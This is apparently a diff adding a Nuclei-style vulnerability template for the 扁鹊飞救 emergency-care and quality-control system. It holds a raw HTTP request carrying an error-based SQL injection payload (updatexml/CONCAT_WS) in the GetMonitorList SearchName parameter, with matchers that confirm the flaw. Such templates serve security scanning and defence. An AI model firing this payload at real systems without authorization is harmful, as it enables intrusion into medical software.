@@ -1,0 +1,25 @@
+id: bianque-GetMonitorList-sql
+
+info:
+  name: 扁鹊飞救智能急救与质控系统 GetMonitorList SQL注入漏洞
+  author: bianque
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(0x71706b7671,1,0x71716a7071),1)+%26%26%27 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error:'
+          - 'qpkvqqqjpq'
+        condition: and
+      - type: status
+        status: 
+          - 500
